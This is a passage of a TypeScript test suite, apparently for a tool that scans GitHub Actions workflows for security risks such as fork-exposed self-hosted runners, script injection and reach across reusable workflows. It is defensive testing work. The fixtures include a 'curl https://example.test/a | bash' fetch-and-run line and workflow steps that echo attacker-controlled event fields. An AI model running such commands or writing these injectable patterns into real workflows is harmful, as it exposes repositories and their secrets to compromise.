    const fork = "    if: github.event.pull_request.head.repo.full_name == github.repository";
    const rescued = jobs(...job("a", [fork]), ...job("b", ["    needs: a", "    if: always()"]));
    expect(selfHosted(rescued).map((f) => f.onPullRequest)).toEqual([false, true]);
  });

  it("reads a needs expression the reader cannot follow as may run", () => {
    expect(selfHosted(jobs(...job("a", ["    needs: ${{ x }}"]))).map((f) => f.onPullRequest)).toEqual([true]);
  });

  it("gives a result lookup on a job that is not a direct need no answer, because GitHub gives it null", () => {
    const fork = "    if: github.event.pull_request.head.repo.full_name == github.repository";
    const hosted = (id: string, extra: string[]) => [
      `  ${id}:`,
      ...extra,
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: echo",
    ];
    // `a` is skipped and `b` runs through always(). `c` needs only `b`, so `needs.a` is null for it and the test is true.
    const yaml = jobs(
      ...hosted("a", [fork]),
      ...hosted("b", ["    needs: a", "    if: always()"]),
      ...job("c", ["    needs: b", "    if: always() && needs.a.result != 'skipped'"]),
    );
    expect(selfHosted(yaml).map((f) => f.onPullRequest)).toEqual([true]);
  });

  it("keeps a job that tests the outputs of a skipped need with no key, which are an empty map and truthy", () => {
    const fork = "    if: github.event.pull_request.head.repo.full_name == github.repository";
    const yaml = jobs(...job("a", [fork]), ...job("b", ["    needs: a", "    if: always() && needs.a.outputs"]));
    expect(selfHosted(yaml).map((f) => f.onPullRequest)).toEqual([false, true]);
  });

  it("gives a result lookup on a name that is not a need no answer", () => {
    const test = (cond: string) =>
      selfHosted(jobs(...job("a"), ...job("b", ["    needs: a", `    if: ${cond}`])))[1]!.onPullRequest;
    expect(test("needs.zzz.result == 'skipped'")).toBe(true);
    expect(test("needs.a.result == 'skipped'")).toBe(true);
    expect(test("needs.a == 'x'")).toBe(true);
    expect(test("needs == 'x'")).toBe(true);
  });
});

describe("attack worlds", () => {
  const names = (set: WorldSet) => WORLDS.filter((_, i) => set & (1 << i)).map((w) => w.name);

  it("puts each world in the sets of its kind, by name", () => {
    expect(names(ALL_WORLDS)).toEqual([
      "workflow_run/fork",
      "workflow_run/base",
      "pull_request_target",
      "pull_request",
      "pull_request_review",
      "pull_request_review_comment",
      "issue_comment",
      "issues",
      "discussion",
      "discussion_comment",
    ]);
    expect(names(HEAD_WORLDS)).toEqual(["workflow_run/fork", "workflow_run/base", "pull_request_target"]);
    expect(names(BASE_RUN_WORLD)).toEqual(["workflow_run/base"]);
    expect(names(PRIVILEGED_WORLDS)).toEqual([
      "workflow_run/fork",
      "workflow_run/base",
      "pull_request_target",
      "issue_comment",
      "issues",
      "discussion",
      "discussion_comment",
    ]);
    expect(names(PULL_REQUEST_WORLDS)).toEqual([
      "pull_request_target",
      "pull_request",
      "pull_request_review",
      "pull_request_review_comment",
    ]);
  });

  it("throws for a name that no world has, so a set cannot quietly leave a world out", () => {
    expect(() => worldsNamed("pull_request", "workflow_run/nowhere" as WorldName)).toThrow(
      "No attack world is named workflow_run/nowhere",
    );
  });

  const reviewed = (trigger: string, condition: string[] = []) =>
    [
      `on: ${trigger}`,
      "permissions: {}",
      "jobs:",
      "  build:",
      ...condition,
      "    runs-on: self-hosted",
      "    steps:",
      "      - run: echo ${{ github.event.pull_request.title }}",
      "",
    ].join("\n");

  it.each(["pull_request_review", "pull_request_review_comment"])(
    "counts a self-hosted job on %s as open to a fork's pull request, and the event as not privileged",
    (trigger) => {
      const found = workflowFacts(reviewed(trigger)).findings;
      expect(found.filter((f) => f.risk === "selfHosted")).toMatchObject([
        { onPullRequest: true, routes: [{ trigger, via: [] }] },
      ]);
      // A fork's run of a review event gets no secrets, so the title in a script is not a script injection here.
      expect(found.filter((f) => f.risk === "scriptInjection")).toEqual([]);
    },
  );

  it("rules a fork's review out of a self-hosted job with a fork guard", () => {
    const guard = "    if: github.event.pull_request.head.repo.fork == false";
    const found = workflowFacts(reviewed("pull_request_review", [guard])).findings.filter((f) => f.risk === "selfHosted");
    expect(found.map((f) => f.onPullRequest)).toEqual([false]);
  });
});

describe("local paths in uses", () => {
  const files = (target: string): [string, string][] => [
    [".github/workflows/c.yml", calling(target)],
    [".github/workflows/m.yml", callee],
  ];

  it.each([
    "./.github/workflows/m.yml",
    "./.github/workflows/../workflows/m.yml",
    "././.github/workflows/m.yml",
    ".//.github//workflows/m.yml",
    "./.github/workflows/m.yml/",
  ])("follows a call to %s as a call to .github/workflows/m.yml", (target) => {
    const found = heads(files(target));
    expect(found).toHaveLength(1);
    expect(found[0]!.routes).toEqual([{ trigger: "workflow_run", via: [{ file: ".github/workflows/c.yml", job: "call" }] }]);
  });

  it.each(["./../.github/workflows/m.yml", "./.github/../../.github/workflows/m.yml", ".github/workflows/m.yml"])(
    "follows no call to %s, which climbs above the root or is not a local path",
    (target) => {
      expect(heads(files(target))).toEqual([]);
    },
  );

  it("follows a call to a composite action through a . segment", () => {
    const action =
      "runs:\n  using: composite\n  steps:\n    - run: echo ${{ github.event.workflow_run.head_branch }}\n      shell: bash\n";
    const caller = withPermissions("on: workflow_run", "      - uses: ./.github/actions/./notify");
    const found = run([
      [WORKFLOW_PATH, caller],
      [".github/actions/notify/action.yml", action],
    ]).findings.filter((f) => f.risk === "scriptInjection");
    expect(found.map((f) => f.file)).toEqual([".github/actions/notify/action.yml"]);
  });
});

describe("the reach hash", () => {
  const TARGET = "./.github/workflows/migrate.yml";
  const MIGRATE = ".github/workflows/migrate.yml";
  const callers = (names: string[], condition = ""): [string, string][] =>
    names.map((name) => [`.github/workflows/${name}.yml`, calling(TARGET, undefined, condition)]);
  const finding = (files: [string, string][]) => {
    const found = heads(files);
    expect(found).toHaveLength(1);
    return found[0]!;
  };
  const UNKNOWN_CALL = "    if: always() && github.event.workflow_run.conclusion == 'success'\n";

  it("differs for five callers a to e and for a to d with z", () => {
    const first = finding([...callers(["a", "b", "c", "d", "e"]), [MIGRATE, callee]]);
    const second = finding([...callers(["a", "b", "c", "d", "z"]), [MIGRATE, callee]]);
    expect(first.reachHash).toMatch(/^[0-9a-f]{16}$/);
    expect(second.reachHash).not.toBe(first.reachHash);
    // The routes shown are the same three either way.
    expect(second.routes).toEqual(first.routes);
  });

  it("differs for 25 callers and 26, although the 26th is past the caps and the routes shown are the same", () => {
    const of = (n: number) => finding([...callers(Array.from({ length: n }, (_, i) => `c${pad(i)}`)), [MIGRATE, callee]]);
    expect(of(26).routes).toEqual(of(25).routes);
    expect(of(26).routesDropped).toBe(of(25).routesDropped);
    expect(of(26).reachHash).not.toBe(of(25).reachHash);
  });

  it("changes when a guard is deleted, from a caller or from the line itself", () => {
    const base = finding([...callers(["a"], UNKNOWN_CALL), [MIGRATE, callee]]).reachHash;
    expect(finding([...callers(["a"]), [MIGRATE, callee]]).reachHash).not.toBe(base);
    const stepGuard = callee.replace(
      "      - uses:",
      "      - if: github.event.workflow_run.conclusion == 'success'\n        uses:",
    );
    const guarded = finding([...callers(["a"]), [MIGRATE, stepGuard]]).reachHash;
    expect(guarded).not.toBe(finding([...callers(["a"]), [MIGRATE, callee]]).reachHash);
  });

  it("changes when a literal in a condition changes, although the text shown is the same", () => {
    const success = finding([...callers(["a"], UNKNOWN_CALL), [MIGRATE, callee]]);
    const failure = finding([...callers(["a"], UNKNOWN_CALL.replace("'success'", "'failure'")), [MIGRATE, callee]]);
    expect(failure.conditions).toEqual(success.conditions);
    expect(failure.reachHash).not.toBe(success.reachHash);
  });

  it("stays the same when lines are added above the call and above the finding", () => {
    const base = finding([...callers(["a"], UNKNOWN_CALL), [MIGRATE, callee]]);
    const [path, caller] = callers(["a"], UNKNOWN_CALL)[0]!;
    const moved = finding([
      [path, `name: Caller\n${caller}`],
      [MIGRATE, `name: Migrate\n# a note\n${callee}`],
    ]);
    expect(moved.line).toBe(base.line! + 2);
    expect(moved.conditions![0]!.line).toBe(base.conditions![0]!.line + 1);
    expect(moved.reachHash).toBe(base.reachHash);
  });

  it("never holds the text of a condition", () => {
    const TOKEN = "tok_S3CRET9";
    const facts = run([...callers(["a"], `    if: always() && github.actor != '${TOKEN}'\n`), [MIGRATE, callee]]);
    const found = facts.findings.find((f) => f.risk === "prHeadCheckout")!;
    expect(found.reachHash).toMatch(/^[0-9a-f]{16}$/);
    expect(JSON.stringify(facts)).not.toContain(TOKEN);
  });

  /** A caller whose `call` job needs `gate`, each with a condition that is not known, and calls `next`. */
  const hop = (i: number, next: string, gate = `g${i}`) =>
    [
      i === 0 ? "on:\n  workflow_run:\n    workflows: [CI]" : "on: workflow_call",
      "permissions: {}",
      "jobs:",
      "  gate:",
      `    if: github.event.workflow_run.conclusion == '${gate}'`,
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: echo gate",
      "  call:",
      "    needs: gate",
      `    if: github.actor != 'a${i}'`,
      `    uses: ./${next}`,
      "",
    ].join("\n");
  const HOPS = [0, 1, 2, 3].map((i) => `.github/workflows/w${i}.yml`);
  const fourHops = (farthestGate: string) =>
    finding([
      ...HOPS.map((path, i): [string, string] => [path, hop(i, HOPS[i + 1] ?? MIGRATE, i === 0 ? farthestGate : undefined)]),
      [MIGRATE, callee],
    ]);

  it("changes when a literal changes in the farthest of eight conditions on one route, past the six a route keeps", () => {
    const base = fourHops("g0");
    expect(base.routes).toEqual([{ trigger: "workflow_run", via: HOPS.map((file) => ({ file, job: "call" })) }]);
    // Each of the four calls has two conditions that are not known, eight in all. The route keeps the nearest six, of
    // which three are shown and three are counted as dropped, and the farthest is the gate of w0.
    expect(base.conditions!.map((c) => [c.file, c.verdict])).toEqual([
      [HOPS[3], "unknown"],
      [HOPS[3], "unknown"],
      [HOPS[2], "unknown"],
    ]);
    expect(base.conditionsDropped).toBe(3);
    const edited = fourHops("changed");
    expect(edited.conditions).toEqual(base.conditions);
    expect(edited.conditionsDropped).toBe(3);
    expect(edited.reachHash).not.toBe(base.reachHash);
  });

  it("changes when a literal changes in the farthest of 22 conditions that a line's job needs, past the 20 a guard keeps", () => {
    const needsChain = (farthest: string) => {
      const yaml = [
        "on: workflow_run",
        "permissions: {}",
        "jobs:",
        ...Array.from({ length: 22 }, (_, i) => [
          `  j${i}:`,
          ...(i > 0 ? [`    needs: j${i - 1}`] : []),
          `    if: github.event.workflow_run.conclusion == '${i === 0 ? farthest : `c${i}`}'`,
          "    runs-on: ubuntu-latest",
          "    steps:",
          i === 21 ? "      - run: echo ${{ github.event.workflow_run.head_branch }}" : "      - run: echo",
        ]).flat(),
        "",
      ].join("\n");
      const found = workflowFacts(yaml).findings.filter((f) => f.risk === "scriptInjection");
      expect(found).toHaveLength(1);
      return found[0]!;
    };
    const base = needsChain("c0");
    // j21 and the 21 jobs it needs, nearest first: the guard keeps 20, three are shown and 17 counted as dropped.
    expect(base.conditionsDropped).toBe(17);
    const edited = needsChain("changed");
    expect(edited.conditions).toEqual(base.conditions);
    expect(edited.reachHash).not.toBe(base.reachHash);
  });

  it("lists no condition from a route past the three shown, though the reach hash counts it", () => {
    const four = (condition: string) => finding([...callers(["a", "b", "c"]), ...callers(["z"], condition), [MIGRATE, callee]]);
    const guarded = four(UNKNOWN_CALL);
    // The routes from a, b and c are shown and carry no condition; z's is the fourth, so its condition is not listed.
    expect(guarded.routes!.map((route) => route.via![0]!.file)).toEqual(
      ["a", "b", "c"].map((name) => `.github/workflows/${name}.yml`),
    );
    expect(guarded.routesDropped).toBe(1);
    expect(guarded.conditions).toEqual([]);
    expect(guarded).not.toHaveProperty("conditionsDropped");
    expect(guarded.reachHash).not.toBe(four("").reachHash);
  });

  it("counts the verdict a condition is shown with, so one guard over two different lines gives them different hashes", () => {
    const injection = (expression: string) => {
      const steps = [
        "      - if: github.event.workflow_run.head_repository.fork || inputs.go",
        `        run: echo \${{ ${expression} }}`,
      ];
      const found = workflowFacts(withPermissions("on: workflow_run", steps.join("\n"))).findings;
      expect(found.filter((f) => f.risk === "scriptInjection")).toHaveLength(1);
      return found.find((f) => f.risk === "scriptInjection")!;
    };
    // The guard is true in the fork-headed world and not known in the base-headed one. head_branch reaches only the
    // fork-headed world, so the guard holds for it; display_title reaches both, so it is not known there.
    const text = "github.event.workflow_run.head_repository.fork || inputs.go";
    const branch = injection("github.event.workflow_run.head_branch");
    const title = injection("github.event.workflow_run.display_title");
    expect(branch.conditions).toEqual([{ file: WORKFLOW_PATH, line: 7, text, verdict: "holds" }]);
    expect(title.conditions).toEqual([{ file: WORKFLOW_PATH, line: 7, text, verdict: "unknown" }]);
    expect(title.routes).toEqual(branch.routes);
    expect(title.reachHash).not.toBe(branch.reachHash);
  });

  it("counts a caller's condition with each verdict it has on the routes, not only the last one found", () => {
    // c1 and c2 both call mid, whose calling job is guarded by `fork || inputs.go`: true in the fork-headed world and not
    // known in the base-headed one. c2 rules the base-headed world out, so its route carries the fork-headed world alone.
    const caller = (condition: string) =>
      `on: workflow_run\npermissions: {}\njobs:\n  call:\n${condition}    uses: ./.github/workflows/mid.yml\n`;
    const mid =
      "on: workflow_call\npermissions: {}\njobs:\n  call:\n    if: github.event.workflow_run.head_repository.fork || inputs.go\n    uses: ./.github/workflows/echo.yml\n";
    const echo = [
      "on: workflow_call",
      "permissions: {}",
      "jobs:",
      "  e:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: |",
      "          echo ${{ github.event.workflow_run.head_branch }}",
      "          echo ${{ github.event.workflow_run.display_title }}",
      "",
    ].join("\n");
    const found = run([
      [".github/workflows/c1.yml", caller("")],
      [".github/workflows/c2.yml", caller("    if: github.event.workflow_run.head_repository.fork\n")],
      [".github/workflows/mid.yml", mid],
      [".github/workflows/echo.yml", echo],
    ]).findings.filter((f) => f.risk === "scriptInjection");
    const [branch, title] = found;
    expect(found.map((f) => f.evidence)).toEqual([
      "github.event.workflow_run.head_branch",
      "github.event.workflow_run.display_title",
    ]);
    // head_branch reaches the fork-headed world alone, where mid's guard holds on both routes. display_title reaches the
    // base-headed world too along c1's route, where it is not known, while on c2's route it still holds.
    expect(branch!.conditions!.map((c) => [c.file, c.verdict])).toEqual([
      [".github/workflows/mid.yml", "holds"],
      [".github/workflows/c2.yml", "holds"],
    ]);
    expect(title!.conditions!.map((c) => [c.file, c.verdict])).toEqual([
      [".github/workflows/mid.yml", "unknown"],
      [".github/workflows/c2.yml", "holds"],
    ]);
    expect(title!.routes).toEqual(branch!.routes);
    expect(title!.reachHash).not.toBe(branch!.reachHash);
  });

  it("is the fixed hash of no reach for a finding that reads no route, which is the hash of no text", () => {
    expect(NO_REACH_HASH).toBe("cbf29ce484222325");
    const facts = workflowFacts(withPermissions("on: push", "      - run: curl https://example.test/a | bash"));
    expect(facts.findings.map((f) => [f.risk, f.reachHash])).toEqual([["curlPipeShell", NO_REACH_HASH]]);
  });
});

describe("repository wide", () => {
  it("gives an unreadable file no entries and drops a file that is not a workflow", () => {
    const facts = supplyChainFacts({
      paths: [".github/workflows/a.yml"],
      listingComplete: true,
      workflows: [file(".github/workflows/a.yml", "")],
      lockfiles: [],
      unread: [],
      blobs: new Map(),
    });
    expect(facts.findings).toEqual([]);
  });
});
